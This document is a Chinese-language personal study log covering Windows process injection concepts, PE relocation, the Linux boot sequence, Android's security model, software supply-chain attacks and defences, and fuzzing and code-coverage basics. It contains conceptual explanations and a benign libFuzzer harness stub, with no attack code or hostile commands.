**Code/Process Injection**: 和hook不同，code injection即给一个process注入一些external code后让他运行。Windows提供一些特定的api用来写入其他process的VM
Inject DLL: injector要求在target中load一个DLL，比如一个plugin，然后target用DLL loader加载DLL
Code injection: 直接向一个在别的thread中分配内存，写入code，执行
APC (Asynchronous Procedure Calls) injection: 相当于把一个task丢给一个远程thread执行，需要先加入queue
Thread-context hijacking: 即修改thread的context，相当于控制execution flow
DLL side-loading: 修改程序依赖的DLL

**Patching**:
* 热补丁(hot patch): 即直接在运行过程中修改内存数据
* 冷布丁(cold/static patch): 即在disk上patch好再开始运行
* SMC(self-modifying code/dynamically unpacked code): 即program本身disk bytes和executed bytes不一样，比如定义了vm，动态解密等。这时候要么在unpack完patch，要么对patch本身进行同样的packing，让程序自己unpack

**PE Relocation**: 如果一个PE不能被load到它要求的base，就需要relocation。因为一些code可能会有基于image base的instruction，如果不相应修改的话，PE会无法正确执行
`.reloc` section会包含相关的信息，即哪些地方有address-sensitive value
Section object: 代表某一片内存有多个mapping。不同进程有不同的mapping，但都能在mapping后访问这一块内存。可以被用于共享内存。
Relocation是ASLR的前提。
我们可以intercept这个过程来试图让dll被map到我们希望的地址: 本来是 DLL name -> 找到image -> 创建section object -> map -> 选择virtual address -> apply relocation
其中，我们可以intercept `ZwOpenSection`去影响哪个section object会被使用; 通过`ZwMapViewOfSection`影响这个section object会被map到哪。
`ntdll.dll`是一个特殊dll，包含很多native api和loader的infra，在process init的早起阶段就有参与。所以当我们可以用hook等手段去操作的时候，一般`ntdll`已经map过了。因此这个手段对他没有效果。

### Day 8
Linux从booting到kernel
主要资料为: https://0xax.dev/books/linux-inside/
这个写的非常好，因此下面的notes基本上可以被认为是上文的缩减+翻译版本。

#### 从bootloader到kernel
按下电源按钮后，motherboard会给power supply发送信号要求供电，在mohterboard接收到power good signal后会让CPU开始运行。在x86-64上，CPU一开始会在real mode中运行，即软件可以无限制直接访问物理内存，没有VM layer。该模式一共有20bit可以用来address(即1M的addressable memory)。
在旧的8086 processor上，register只有16bit，因此需要用memory segmentation的办法，用两个register(一个表示segment一个表示offset)来确定一个内存位置。在更现代的CPU上，尽管physical bus变宽了，但real mode时的地址计算仍然基于类似逻辑。

在系统power on的时候，CPU会reset并设置`ip`等register的值。然后CPU会计算出第一条instruction的位置，在比较新的x86系统上都是`0xffff_fff0`，这个也被称作reset vector。这里通常会包含一些jump instruction指向BIOS或者UEFI的entry point。

对于BIOS，首先会进行POST(power-on self-test) routine检查，然后找到一个OS去启动。BIOS有一个boot order，存在config里。(用双系统的话应该很熟悉这个) 当BIOS试图从harddrive boot的时候，首先寻找一个boot sector。比如，对于有MBR (master boot record) partition layout的hard drive来说，boot sector会存在第一个sector的前446 bytes。第一个sector的最后两个bytes的值固定。BIOS找到一个可用的boot sector后会将其复制到`0x7C00`然后开始执行。

接下来控制权就被交给了boot loader。Linux有boot protocol指出一个bootloader需要满足什么条件来支持linux boot。这里主要介绍GRUB 2，对于linux user来说如果曾经有因为某些原因处理磁盘不慎，大概率是见过grub的页面的吧。

bootloader的唯一目的就是，载入core image然后jump to it。首先需要把core image载入内存(一般就存在磁盘中第一个sector后面)，然后进入`grub_main`，初始化console，设置root device (即读如modules和config的磁盘)，load and parse config，load modules。然后我们就会看到熟悉的grub menu，可以选择load哪一个os。

最终，bootloader成功载入kernel和kernel的setup code，然后jump到了目标address。kernel setup首先要从real mode切换到protected mode(字面意思，有vm，paging等特性的mode，同时也允许更长的地址)，最终进入到long mode(即可以使用64b instructions/registers的mode)。然后configure kernel decompressor，去decompress kernel再jump过去。

在jump到`start_of_setup` label后，setup code开始真正工作。
首先让`ds`和`es`这两个segment registers相同，然后清除direction flag (即控制string processing的direction的flag)。目的是为了之后清理bss部分。然后是准备过渡到C code，先要设置 stack，然后check Magicnumber确保正在运行一个valid linux kernel setup binary，再清除`.bss`段。然后就可以执行`main.c`了！


更多关于Protected mode: protected mode中使用global descriptor table (GDT)去管理memory segmentation。每个descriptor都是64b长，仍然是20个bit的limit，但有一个特殊的G bit表示这个limit指的是bytes还是pages。因此最多能表示的segment size是4GB。
比较有意思的是对code segment有常规的RX bit。然后实际上code可以是execute-only的。在linux上，一个execute-only的binary即不能被用户打开，但可以直接执行。不过这不能阻止用户用debugger然后观察内存中的行为。

#### 进入main.c
main function的第一件事就是`init_default_io_ops`，即初始化用来读写一个IO port的function pointer。然后将header copy到C的`boot_params` struct中。注意此时还没boot完，所以使用的`memcpy`是kernel内部的实现而不是clib的`memcpy`。

简单看一下memcpy的实现，其实就是用`rep movsl`每次copy 4个bytes，再用`rep movsb` copy剩下的几个byte。

接下来就是initialize console，然后就可以print了。再initialize heap，也很简单，就直接根据config中的`heap_end_ptr`设置一下就可以。然后需要`validate_cpu`，检测cpu是否满足kernel要求。然后检测可用的memory，这一步需要询问system的firmware来获得物理内存相关的信息。具体来说，kernel需要唤起BIOS interrupt，用一个特殊的BIOS interface来检查内存。在dmesg中我们可以看到BIOS-provided physical RAM map，包括哪些是usable的。在内存检测完成后，kernel继续initialize keyboard。

需要注意的是这里的heap，stack，bss和我们说的process vm里的这些segment并不完全一样(尽管概念上大致相同)

#### Video Modes
Video mode指的是一个预先定义好的screen configuration，负责提供分辨率，色深，text/graphic等信息。
传入`vga=ask`可以看到所有可以选择的mode
Video mode相关的params会被存到heap上的一个struct。在设置完video mode后就可以准备进入protected mode了

在`go_to_protected_mode`中，首先会调用real mode switch hooks，如果没有hook则会disable NMI (Non-maskable interrupt)。disable NMI很重要，因为在switch的过程中，没有任何valid handlers可以去处理interrupt。在成功切换mode后，interrupt会被重新enabled。NMI即不管permission如何都会直接执行的interrupt。在disable后会调用`io_delay`，原地等待大约1ms确保interrupt已经被disabled

然后需要enable A20 line (address line 20，用来传地址)，这个会允许kernel处理1M以上的内存。再reset math coprocessor (比如FPU, floating point unit)

如前面所说，所有interrupt都要disable。所以接下来也要disable所有PIC(Programmable interrupt controller)上的interrupt

在进入protected mode前还有两步: 设置Interrupt Descriptor Table和Global Descriptor Table (这个在前面提到过了)
在Real Mode中，interrupt handling基于interrupt vector table，而在protected mode中会基于interrupt descriptor table. 这个设置起来也很简单，直接load一个空的就行。
在initialization的时候，GDT包含三个segment: Code(`CS`), memory(data, `DS`), task state(`TSS`, used for intel VT virtualization)

`CS`和`DS`的limit都被定义为`0x0`到`0xffff_ffff`. (Flat memory model设计)
然后就可以进入protected mode了！asm中用的一个小技巧是，用一个原地的jump来保证cpu丢弃prefetch的real mode下的instruction。

实际上并没有太多复杂的东西，关键在于，我们如何和硬件交互。后面三小章简单浏览了下，这里就不记录notes了。

### Day 9
原仓库的这一节是有关android安全，内容比较杂。这里主要选取几个领域，并且主要基于官方的document进行简单的学习。并不会很深入。
References:
* 官方security tips(https://developer.android.com/privacy-and-security/security-tips)
* OWASP MASTG(https://mas.owasp.org/MASTG/): 基本可以当wiki看，非常全面，涵盖各种mobile security的testing和RE技巧 

Android的基本Security model: sandbox + IPC (inter-process communication)
基本的assumption是，applications do NOT trust each other。每个application都有一个unique的Linux UID，然后都是在sandbox中运行，这是在kernel level就强制的。
一个UID所拥有的资源(files和processes)对其他UID并不直接可见，必须借助IPC通信(主要通过Android Binder)。在此之上也有更高level的 abstraction，比如Intent (用来要求其他app component进行一个操作), Services (进行长时间后台活动), ContentProvider (允许app安全分享数据或者获取system-wide数据)。
Android使用AIDL (Android Interface Definition Language)去定义IPC的interface。
Binder是android底层的IPC机制。可以认为，exported binder service，就类似于一个本地的API endpoint可以给其他app使用。因此要和处理web server时暴露哪些http endpoint一样谨慎。

`Intent`是描述一个operation的message。explicit intent即直接指明一个target，implicit即描述谁应该来handle这个intent。其中，如果使用mutable pending intent，外部有可能可以通过修改这个intent来以当前applicator的身份进行一些操作，是比较危险的。

AndroidAPK即安装包，包含
* `AndroidManifest.xml`: 包括很多信息，包括permissions，activitites，services，app的configuration之类的。一般在RE的时候第一个要看的就是这个。
* `classes.dex`: 编译好的bytecode。在比较新的android上一般会用jit加速，在老的android则直接用Dalvik Virtual Machine (DVM)直接运行。
* `lib/`: native libraries
* `res/`, `assets/`, ...

每个APK必须被signed。开发者必须sign整个apk。attacker如果修改了其中任何内容，则signature都会失效

Android Attack Interface: 和app security有关的主要是下面这几个components 
* `Activity`: 控制UI/screens
* `Service`: 控制background/api-like的功能，有unauthroized privileged operations的风险
* `BroadcastReceiver`: 接受event messages，可能会有假的broadcast
* `ContentProvider`: 如前面所说，这个是用来share data的，因此有unauthorized R/W的风险

在manifest中，我们可以设置`android:exported="false"`，来让所有的component只能被这个app自己access/trigger。

Data: 
* Storage: 最安全的储存是app-private internal storage，即在sandbox内仅自己可见。所有外部存储都有一定程度风险
* Network: use TLS。(SSL pinning: embed/hardcode SSL certificate or public key)
* WebView: 这个东西还挺臭名昭著的，即在app中embed一个broswer。在这里我们不管性能问题，但安全上需要防止web content通过js来触发原生app的一些功能。也就是对WebView的file access之类的功能应该进行一些限制。
* Secrets: Android keystore，由os提供的隔离程度更强的managing keys的一个system

Android RE的基本工具:
* `jadx`: decode manifest/resources，decompile code，总之就是上手第一个用的工具
* `adb`: android上的debugger。可以配合emulator一起使用
* `frida`(https://github.com/frida/frida): dynamic intrumentation tool，可以加hook或者做一些injection
* 其他通用工具，比如用ghidra来RE apk中调用的`.so` file，或者用burp suite截取流量等。

Androi anti-RE工具:
* `ProGuard`, `DexGuard`进行obfuscation


### Day 10-11
这部分讲的是供应链攻击，最近也经常听到类似新闻。这两天以概念为主，因此合并

软件供应链：软件是由代码、第三方库(dependencies)、开发工具、构建环境、分发渠道、更新服务等共同生产出来的。
在今天，整个链条可以被认为是 source -> dependencies -> build -> CI/CD -> publish -> registery -> install -> runtime
只要有一个节点被攻击，整个链条都会被影响。

Ken Thompson's Trusting Trust attack: 即使源代码是安全的，不意味着最终的binary就是安全的。如果编译器被恶意修改，在编译特定部分的时候插入backdoor，那么binary也会是insecure的。这个观点继续递归，比如compile compiler source的compiler可能不是safe的。
在现代的开发中，我们需要trust的东西太多了，而其中每个步骤实际上都可能被污染。
因此现在强调一些source code review之外的技术/步骤: 
* reproducible builds
* build provenance: verifiable, cryptographically signed record，记录一个软件是如何build出来的，包含source code, build tools, inputs和详细步骤
* SBOM (software bill of materials): machine-readable inventory of all the components, libraries, dependencies that make up a software app
* SLSA (supply-chain levels for software artifacts): 一个开源的框架用来establish software provenance

案例: 2015年XcodeGhost。攻击者给Xcode上传了一个malicious version的Xcode，然后被开发者下载。该软件在build的过程中会inject一些malicious的object files，进而获取sensitive data。这个供应链上游的攻击可以影响到非常多的ios app
案例: 2017的CCleaner。CCleaner事一个清理工具，attacker通过偷取公司员工的credentials来获取内部网络，然后将原来的installation file替换为了他的包含backdoor的版本，进而将敏感信息送到他的server。可以看出，供应链攻击的一个重要性质就是利用信任。用户信任软件厂商，一旦成功从供应链上游攻击，这个信任会让用户直接使用被恶意替换的软件。
案例: 2017的NotPetya。通过攻击软件更新渠道来分发，然后利用著名的永恒之蓝漏洞(eternal blue)去传播。用户天然信任这些软件更新的渠道，大部分人不会产生额外怀疑。

Dependency graph: 只要软件的任何一个indirect dependency是malicious的，这个软件都会受到影响。Dependency graph会帮助我们分析一个问题的blast radius。

攻击者的污染路径:
* source-code: 攻击者拿到maintainer account/ssh key，直接修改源码。这种在CR的时候一般比较容易被发现(但我印象里也有植入的代码一路活到release的例子)
* build-time compromise: 攻击build environment，让clean source build出malicious artifact
* typosquatting: 这个很经典。在用包管理器安装的时候，很容易在package name里出现typo进而安装了别的package。因此attacker可以故意注册一些相似的名字来诱骗用户。在npm和PyPI中都非常常见。不过现在包安装很多时候都让ai agent处理，人类typo的问题倒是减少了也说不定
* dependency confusion: 一个闭源软件本来用的是内部版本的package，attacker发布一个名字相同的public package，版本很高。这样本来包管理器应该用内部的private版本，但解析逻辑优先选择了外部的更高版本，就会无意间安装malicious package。攻击者只需要知道内不得package name就可以执行攻击
* npm life cycle scripts: `npm`中可以定义一些scripts (hooks)，比如`npm install`时自动执行`preinstall`, `install`, `postinstall`对应的scripts。攻击者可以通过phishing来偷取credentials，然后修改发布一个malicious的版本。这个比直接在代码中注入backdoor更隐蔽。

2025年9月，攻击者攻击了18个高流量的JS packages，包括`chalk`, `debug`等。其使用的攻击手段就是通过phishing来获得一个major maintainer的账户信息。攻击者注入了highly obfuscated script，针对cryptocurrency的交易进行攻击。
还是2025年9月，Shai-Hulud attack。这应该是近期最大的供应链攻击，仍然是针对npm的。该攻击利用的是`preinstall` script，在installation完成前便直接执行恶意代码。该攻击自动扫描环境窃取credentials并且self-replicating，影响了非常多的packages和开源仓库，包括一些非常著名的。

相当多的攻击依靠假软件，repackaged软件，假updates，低质量广告引流等方式。在如今，这一类攻击甚至更加进化，攻击者的目标不只是user，更是developer/maintainer，只要成功一次就可以影响非常大范围的软件和用户。

一些重要的理念:
* lockfile应该提交进git。lockfile可以提高build的确定性，防止因为一些更新而引入malicious code
* cool-down period: 不要立刻更新最新版本。等待一段时间后，软件被证明没有问题了之后，再去更新
* SBOM (software bill of materials): 前面提到过，就是用来快速检测，在某个包的某个版本被发现有问题后，自己分发过的软件里是否曾经有用过这个特定的版本的包。
* provenance: 回答这个包在哪个repo哪些commit由哪个workflow在哪个env产生的问题
* Trusted-publishing (OIDC, OpenID connect): 即软件发布不应该直接使用一个`NPM_TOKEN`，而是需要OIDC(基于OAuth2的认证) identity。长lifetime的token本身就是不够安全的，一旦被偷，blast radius会很恐怖。现在，maintainer identity的security就直接和software supply-chain security挂钩，再加上2FA/MFA的推广，可以有效组织供应链攻击。

### Day 12-14
这部分讲的是用graph工具分析security，但这个感觉不是特别重要，因此跳过了。

### Day 15
Fuzzing: 思想很简单，就是不断构造随机的输入给程序，然后捕捉crash，各种bug。
原文给到的fuzzingbook中有对于fuzzing的基本介绍: https://www.fuzzingbook.org/html/Fuzzer.html

现代的fuzzer有一些更加高级的feature，比如，根据feedback来自己evolve inputs。
一些概念:
* harness (这个harness要比如今的harness engineering的概念出现得早得多): 即一小段code把fuzzing引擎和实际想要测试的代码连接起来。一个好的harness应该exercise meaningful functionality，而把无关要素去除。尽可能deterministic，保证可以复现结果。target越narrow，效果越好
```cpp
// libFuzzer example
// fuzz_target.cc
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  DoSomethingInterestingWithMyAPI(Data, Size);
  return 0;  // Values other than 0 and -1 are reserved for future use.
}

```
* corpus: 即input的集合。可以理解为一个压缩的，已经被发现，代表程序不同行为的东西。我们希望保证corpus尽可能小的同时不影响coverage
* mutation: 修改已经有的input来获取新的input，比如flip一个bit，duplicate一个区域，swap两块区域，insert一些bytes之类的。对于图像一类的输入，mutation的效果往往很好。一个fuzzer可以进行一些mutation，然后看看是否跑到了新的code，存下这个mutation，再进一步修改。因此fuzzing可以分为mutation-based和generation-based
* coverage feedback: 现代fuzzer一般是coverage-guided的。fuzzer会追踪edge/block coverage, counters, 以及一些其他信息，来保证如果input cover到了新的区域，就存入corpus中
* sanitizer: 即检测memory-safety，ub，或者其他行为的工具。写C++的应该非常熟悉这些。
* in-process execution: fuzzer的速度很重要。in-process fuzzer可以不用每个test都重复一遍起进程+exit的过程。但是必须保证每次跑的test都是isolated的。在一个process中跑就失去了process天然带来的isolation，因此需要保证不会有global state留下而影响后面的test
* dictionary: 已知的有意义的一串bytes/tokens
* CMP/value feedback: 通过一些方式让fuzzer知道一些CMP里的operands，可能是某些magic numbers
* structured fuzzing: 针对SQL之类的有结构的语言，如果结构错了会被parser立刻拒绝。所以需要让fuzzer知道这个结构，然后在结构(比如以AST表示)上修改
* crash detection: 在crash之后需要记录input以便于复现
* crash triage: reproduce+minimize testcase+symbolize，然后deduplicate。目的是去除不同test检测到的同一个bug

Reference: https://llvm.org/docs/LibFuzzer.html

第二部分关于[`r2`](https://github.com/radareorg/radare2)，我个人感觉ghidra在使用体验上还是要比r2更胜一筹。但r2胜在他是cli+tui，因此更加AI-friendly。
[`r2pipe`](https://book.rada.re/scripting/r2pipe.html)允许将r2结合其他语言一起使用，比如结合python script。这个只需要了解一下，实际使用的话可以告诉ai本机已经安装这些工具，ai会自己使用的。

### Day 16
Reference: 
https://www.fuzzingbook.org/html/Coverage.html
https://clang.llvm.org/docs/SourceBasedCodeCoverage.html
https://clang.llvm.org/docs/SanitizerCoverage.html
Code Coverage: 用来测试或衡量 fuzzing或testing 的效果的指标。

Black-box testing: 把程序当black-box看待，直接test期望的behavior
White-box testing: 从源代码考虑测试。测试的是implemented behavior
* Statement coverage: 每个statement必须被至少一个input执行到
* Branch coverage: 每个branch指少被一个input执行到

Clang的source-based code coverage feature是基于AST和预处理信息的，因此结果会十分准确。
Clang提供SanitizerCoverage和gcov(gcc-compatible implementation)。SanitizerCoverage非常强大，由各种功能，可以track各种数据，可以自己定义callback。编译器在打开特定编译选项的时候，会在一些位置插入`__sanitizer_cov_trace_*`来达成tracing的目的。

我们用`-fprofile-instr-generate -fcoverage-mapping`选项就可以开启coverage。如果开启了和没开启的code link到一起，没开启coverage instrument的code会在report中被忽略。另外，可以用`-fcoverage-mcdc`开启modified condition/decision coverage(MCDC)
我们可以用`llvm-cov`不同的选项查看report，report会清晰展示各种信息，比如branch coverage info (true/false的次数)，functions, regions, statements，很详细。

原repo的第二部分都是很general的一些concept，这里总结一下
* Abstract Interpretation: 用更简单的abstract domain来代表一个更大的concrete program的集合
* CFG (Control-flow analysis/graph): 即分析control flow
* Data-flow analysis: 即分析data如何通过CFG传播
* Interprocedural analysis: 分析信息如何通过function call传播。framework: IFDS, IDE
* Sparse/value-flow analysis: 并不直接通过完整的CFG传播所有信息，而是只考虑有用的。用来降低计算
* Taint analysis: 分析sensitive info如何传播，或者分析input如何传播(本质都是分析特定数据的传播)
* Symbolic execution: 即用symbolic value去执行。会有path explosion的问题
* Concolic execution: 即结合execution和symbolic reasoning
* Intermediate representations (IRs): 学过编译原理的应该了解，就是一种在source和binary之间的中间表达形式

